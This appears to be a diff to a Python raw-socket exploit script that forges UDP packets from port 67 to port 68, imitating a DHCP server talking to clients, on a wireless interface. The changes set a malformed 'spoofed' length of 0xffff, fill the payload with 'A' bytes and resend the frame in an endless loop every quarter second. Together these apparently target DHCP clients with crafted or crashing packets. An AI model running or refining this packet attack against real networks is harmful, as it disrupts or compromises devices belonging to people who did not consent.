@@ -1,6 +1,7 @@
 from socket import *
 import struct
 from binascii import *
+import time
 import os
 
 ICMP = 0x01
@@ -18,6 +19,9 @@ def sendeth(src, dst, eth_type, payload, iface):
 
     print 'ether frame: %s' % hexlify(dst + src + eth_type)
 
+    while True:
+        s.send(dst + src + eth_type + payload)
+        time.sleep(0.25)
     return s.send(dst + src + eth_type + payload)
 
 def pack(buf):
@@ -87,7 +91,7 @@ iface = 'wlan1'
 payload = b''
 payload += pack([0x00, 67]) # SRC PORT
 payload += pack([0x00, 68]) # DST PORT
-payload += pack([0x00, 0x01]) # LENGTH (spoofed
+payload += pack([0xff, 0xff]) # LENGTH (spoofed
 payload += pack([0x00, 0x00]) # Checksum (disabled)
 payload += 'A'*236
 
